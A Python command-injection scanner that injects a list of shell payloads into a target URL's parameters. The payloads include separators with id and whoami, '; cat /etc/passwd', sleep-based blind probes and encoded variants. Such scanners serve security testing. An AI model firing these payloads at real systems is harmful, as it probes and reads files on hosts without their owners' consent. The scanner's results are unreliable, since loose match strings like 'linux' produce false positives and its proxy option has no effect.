#!/usr/bin/env python3
"""
Command Injection Scanner
Detects command injection vulnerabilities
"""

import requests
import argparse
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# Command injection payloads
PAYLOADS = [
    # Basic command separators
    "; id",
    "; whoami",
    "; uname -a",
    "; pwd",
    "; ls",
    "; cat /etc/passwd",
    
    # AND operator
    "&& id",
    "&& whoami",
    "&& uname -a",
    "&& pwd",
    
    # OR operator
    "|| id",
    "|| whoami",
    "|| uname -a",
    
    # Pipe operator
    "| id",
    "| whoami",
    "| uname -a",
    
    # Backticks
    "`id`",
    "`whoami`",
    "`uname -a`",
    
    # Command substitution
    "$(id)",
    "$(whoami)",
    "$(uname -a)",
    
    # Time-based
    "; sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    "| sleep 5",
    "; ping -c 5 127.0.0.1",
    "; timeout 5",
    "; waitfor delay '00:00:05'",
    
    # Windows specific
    "& whoami",
    "&& whoami",
    "| whoami",
    "|| whoami",
    "; whoami",
    "%0a whoami",
    "%0d whoami",
    
    # Encoding variations
    "%3B%20id",
    "%26%26%20id",
    "%7C%20id",
    "%0A id",
    "%0D id",
    "%0D%0A id",
    
    # Alternative syntax
    ";id",
    ";id;",
    "|id",
    "||id",
    "&&id",
    "`id",
    "$(id)",
    
    # Blind detection
    "; sleep ${IFS}5",
    "; sleep${IFS}5",
    ";${IFS}sleep${IFS}5",
]

# Patterns that indicate command execution
SUCCESS_PATTERNS = [
    "uid=",
    "gid=",
    "root:x:",
    "daemon:x:",
    "bin:x:",
    "sys:x:",
    "www-data",
    "apache",
    "nginx",
    "root:",
    "administrator",
    "nt authority",
    "windows",
    "linux",
    "darwin",
]


def test_payload(url, param, payload, method="GET", data=None):
    """Test a single payload"""
    try:
        start_time = time.time()
        
        if method.upper() == "GET":
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if param not in params:
                return False, None
            
            params[param] = payload
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            response = requests.get(test_url, timeout=15)
        else:
            test_data = data.copy() if data else {}
            test_data[param] = payload
            response = requests.post(url, data=test_data, timeout=15)
        
        elapsed = time.time() - start_time
        
        # Check for success patterns
        response_text = response.text.lower()
        for pattern in SUCCESS_PATTERNS:
            if pattern in response_text:
                return True, f"Command output detected: {pattern}"
        
        # Check for time-based detection
        if elapsed > 4:
            return True, f"Time-based detection (delay: {elapsed:.2f}s)"
        
        return False, None
        
    except requests.Timeout:
        return True, "Timeout (possible time-based injection)"
    except Exception as e:
        return False, str(e)


def scan_url(url, method="GET", data=None):
    """Scan URL for command injection"""
    print(f"[*] Scanning: {url}")
    print(f"[*] Method: {method}")
    
    # Parse parameters
    if method.upper() == "GET":
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
    else:
        params = list(data.keys()) if data else []
    
    if not params:
        print("[!] No parameters found")
        return []
    
    print(f"[*] Found {len(params)} parameter(s): {', '.join(params)}\n")
    
    vulnerabilities = []
    
    for param in params:
        print(f"[*] Testing parameter: {param}")
        
        for payload in PAYLOADS:
            is_vuln, message = test_payload(url, param, payload, method, data)
            if is_vuln:
                print(f"[+] Command injection found!")
                print(f"    Payload: {payload}")
                print(f"    Details: {message}")
                vulnerabilities.append({
                    "param": param,
                    "payload": payload,
                    "message": message
                })
                break
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="Command Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-d", "--data", help="POST data (format: key=value&key2=value2)")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    # Parse POST data
    post_data = None
    if args.data:
        post_data = {}
        for item in args.data.split('&'):
            if '=' in item:
                key, value = item.split('=', 1)
                post_data[key] = value
    
    vulnerabilities = scan_url(args.url, args.method, post_data)
    
    # Print summary
    print("\n" + "="*60)
    print("SCAN SUMMARY")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} command injection vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Payload: {vuln['payload']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[+] No command injection vulnerabilities detected")
    
    # Save results
    if args.output and vulnerabilities:
        with open(args.output, 'w') as f:
            for vuln in vulnerabilities:
                f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Details: {vuln['message']}\n")
                f.write("-"*40 + "\n")
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
